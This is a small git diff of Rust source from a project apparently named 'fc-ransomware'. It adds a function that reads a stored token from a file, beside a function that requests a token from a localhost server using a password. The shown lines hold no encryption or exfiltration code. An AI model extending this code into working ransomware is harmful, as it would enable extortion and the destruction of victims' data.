@@ -1,5 +1,5 @@
 use clap::{App, Arg, ArgMatches};
-use std::{fs, result, io, path};
+use std::{fs, result, str, io, path};
 
 pub fn get_args<'a>() -> ArgMatches<'a> {
     App::new("fc-ransomware")
@@ -47,4 +47,9 @@ pub fn run_operation(path_to_file: &path::PathBuf, key: &str) -> result::Result<
 pub fn get_token(password: &str) -> Result<reqwest::Response, reqwest::Error> {
   let url = format!("http://localhost:3000/token?password={password}", password = password);
   reqwest::get(&url)
+}
+
+pub fn get_stored_token(stored_token_path: &path::PathBuf) -> String {
+  let stored_token_bytes = fs::read(&stored_token_path).unwrap_or_default();
+  str::from_utf8(&stored_token_bytes).unwrap_or("").to_string()
 }
